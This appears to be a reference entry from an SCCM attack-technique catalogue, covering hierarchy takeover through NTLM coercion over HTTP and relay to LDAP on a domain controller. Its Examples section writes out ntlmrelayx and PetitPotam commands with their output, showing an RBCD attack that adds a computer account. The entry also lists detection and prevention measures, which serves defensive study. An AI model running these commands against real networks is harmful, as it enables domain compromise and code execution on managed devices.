# TAKEOVER-8
## Description
Hierarchy takeover via NTLM coercion and relay HTTP to LDAP on domain controller

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-8.1: Coerce primary site server 
    - TAKEOVER-8.2: Coerce SMS Provider
    - TAKEOVER-8.3: Coerce passive site server
    - TAKEOVER-8.4: Coerce site database server
- Connectivity from the coercion target to any port on the relay server
- The relay server is in the intranet zone and has a valid NetBIOS name or FQDN (e.g., via ADIDNS poisoning if using a network implant)
- Coercion target settings:
    - The `WebClient` service is installed and started [INSTALLED BY DEFAULT ON WINDOWS WORKSTATIONS]
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
    - Domain computer account is not `is sensitive and cannot be delegated` [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Connectivity from the relay server to LDAP or LDAPS on the relay target, the domain controller
- Relay target settings:
    - Either LDAP signing or channel binding is not required on the domain controller [DEFAULT]
    - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

- For resource-based constrained delegation:
    - Control of an account's SPN

        OR

    - `MachineAccountQuota` > `0` and domain users permitted to add computer accounts [DEFAULT]

## Summary
An attacker who is able to successfully coerce NTLM authentication from the Active Directory domain computer account for a primary site server, system hosting the SMS Provider role, or passive site server via HTTP and relay it to LDAP on a domain controller can conduct resource-based constrained delegation (RBCD) or shadow credentials attacks to compromise the server, then connect to:
- MSSQL on the site database as the site server or SMS Provider (see [TAKEOVER-1](../TAKEOVER-1/takeover-1_description.md))
- SMB on the site database as the site server (see [TAKEOVER-2](../TAKEOVER-2/takeover-2_description.md))
- SMB on the SMS Provider as the site server (see [TAKEOVER-6](../TAKEOVER-6/takeover-6_description.md))
- SMB on the site database server or an SMS Provider as itself
- SMB on the primary site server as a passive site server, or vice versa (see [TAKEOVER-7](../TAKEOVER-7/takeover-7_description.md))

The attacker can use these permissions to grant an arbitrary domain account the SCCM "Full Administrator" role.

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [PREVENT-11: Disable and uninstall WebClient on site servers](../../../defense-techniques/PREVENT/PREVENT-11/prevent-11_description.md)
- [PREVENT-13: Require LDAP channel binding and signing](../../../defense-techniques/PREVENT/PREVENT-13/prevent-13_description.md)
- [PREVENT-16: Remove SeMachineAccountPrivilege and set MachineAccountQuota to 0 for non-admin accounts](../../../defense-techniques/PREVENT/PREVENT-16/prevent-16_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Subtechniques
- TAKEOVER-8.1: Coerce primary site server 
- TAKEOVER-8.2: Coerce SMS Provider
- TAKEOVER-8.3: Coerce passive site server
- TAKEOVER-8.4: Coerce site database server

## Examples
The steps to execute TAKEOVER-8.1 through TAKEOVER-8.4 are mostly the same except that a different system is targeted for coercion of NTLM authentication.

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the domain controller and the LDAPS service and specifying options to conduct a resource-based constrained delegation attack:
    ```
    # impacket-ntlmrelayx --no-smb-server --no-wcf-server --no-raw-server -ts -ip <NTLMRELAY_LISTENER_IP> -t ldaps://<DOMAIN_CONTROLLER_IP> --http-port 8080 --no-da --delegate-access
    Impacket v0.11.0 - Copyright 2023 Fortra

    [2024-02-28 20:31:35] [*] Protocol Client MSSQL loaded..
    [2024-02-28 20:31:36] [*] Protocol Client LDAPS loaded..
    [2024-02-28 20:31:36] [*] Protocol Client LDAP loaded..
    [2024-02-28 20:31:36] [*] Protocol Client RPC loaded..
    [2024-02-28 20:31:36] [*] Protocol Client HTTPS loaded..
    [2024-02-28 20:31:36] [*] Protocol Client HTTP loaded..
    [2024-02-28 20:31:36] [*] Protocol Client IMAP loaded..
    [2024-02-28 20:31:36] [*] Protocol Client IMAPS loaded..
    [2024-02-28 20:31:36] [*] Protocol Client SMTP loaded..
    [2024-02-28 20:31:36] [*] Protocol Client SMB loaded..
    [2024-02-28 20:31:36] [*] Protocol Client DCSYNC loaded..
    [2024-02-28 20:31:38] [*] Running in relay mode to single host
    [2024-02-28 20:31:38] [*] Setting up HTTP Server on port 8080

    [2024-02-28 20:31:38] [*] Servers started, waiting for connections
    ```

3. From the attacker host, coerce NTLM authentication from the coercion target via HTTP, targeting the relay server's IP address and the specified port:
    ```
    # python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p <PASSWORD> <NTLMRELAYX_NETBIOSNAME>@8080/a <COERCION_TARGET_IP>            

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:192.168.57.50[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an HTTP connection on the relay server that is forwarded to the domain controller to execute the RBCD attack:
    ```
    [2024-02-28 21:01:54] [*] HTTPD(8080): Connection from 192.168.57.50 controlled, attacking target ldaps://192.168.57.100
    [2024-02-28 21:01:54] [*] HTTPD(8080): Authenticating against ldaps://192.168.57.100 as MAYYHEM/SITE-SERVER$ SUCCEED
    [2024-02-28 21:01:54] [*] Enumerating relayed user's privileges. This may take a while on large domains
    [2024-02-28 21:01:54] [*] HTTPD(8080): Connection from 192.168.57.50 controlled, but there are no more targets left!
    [2024-02-28 21:01:55] [*] Attempting to create computer in: CN=Computers,DC=MAYYHEM,DC=LOCAL
    [2024-02-28 21:01:55] [*] Adding new computer with username: FCDQZAOC$ and password: OHG^rQ.yl8KcFAC result: OK
    [2024-02-28 21:01:55] [*] Delegation rights modified succesfully!
    [2024-02-28 21:01:55] [*] FCDQZAOC$ can now impersonate users on SITE-SERVER$ via S4U2Proxy
    ```

4. Obtain a service ticket for the created or specified account with an SPN, impersonating the coercion target.

5. Pass the ticket, access the coercion target, escalate to `SYSTEM`, and connect to:
- MSSQL on the site database as a site server or SMS Provider ([TAKEOVER-1](../TAKEOVER-1/takeover-1_description.md))
- AdminService on an SMS Provider as a site server ([TAKEOVER-2](../TAKEOVER-2/takeover-2_description.md))
- SMB on the site database or an SMS Provider as a site server ([TAKEOVER-6](../TAKEOVER-6/takeover-6_description.md))
- SMB on the site database server or an SMS Provider as itself
- SMB on the site server as a passive site server, or vice versa ([TAKEOVER-7](../TAKEOVER-7/takeover-7_description.md))

## References
- Chris Thompson, [Coercing NTLM Authentication from SCCM Servers](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
- Elad Shamir, [Wagging the Dog: Abusing Resource-based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- Garrett Foster, [SCCM Hierarchy Takeover with High Availability](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43)
